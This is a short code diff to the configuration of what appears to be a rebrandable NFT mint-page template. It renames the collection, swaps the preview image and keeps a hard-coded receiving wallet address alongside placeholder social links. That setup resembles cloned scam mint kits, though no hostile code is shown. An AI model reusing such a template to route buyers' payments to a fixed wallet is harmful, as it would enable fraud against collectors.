@@ -10,14 +10,14 @@ const receiveAddress = "0xd4550697Fe601BdAeD1E591d47A887Aa7097400a";
 */
 
 const collectionInfo = {
-    name: "MINDBLOWON",
+    name: "9TALES NFT",
     date: "13.05.2022",
     socialMedia: {
         discord: "discord.gg/invite_here",
         twitter: "https://twitter.com/username_here",
     },
     medias: {
-        preview: "ezgif.com-gif-maker (2).gif",
+        preview: "prev.gif",
         favicon: "icon.png",
     },
     background: {
